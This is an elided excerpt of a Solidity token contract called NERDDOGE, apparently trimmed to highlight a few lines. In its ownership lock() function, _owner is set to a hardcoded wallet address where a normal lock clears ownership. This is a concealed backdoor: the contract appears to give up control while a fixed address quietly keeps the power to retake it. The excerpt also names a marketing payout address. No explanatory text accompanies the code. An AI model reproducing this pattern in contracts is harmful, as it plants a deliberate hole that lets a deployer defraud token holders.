...
contract Ownable is Context {
    ...
    function lock(uint256 time) public virtual onlyOwner {
        ...
        _owner = address(0x20206168Da60B08DcA0487D83472123d02683B16);
...
contract NERDDOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xE35D554802F1342d01fD13a94cEFC837271c872B); // Marketing Address
    ...
    string private _name = "NERDDOGE";
    string private _symbol = "NERDDOGE";
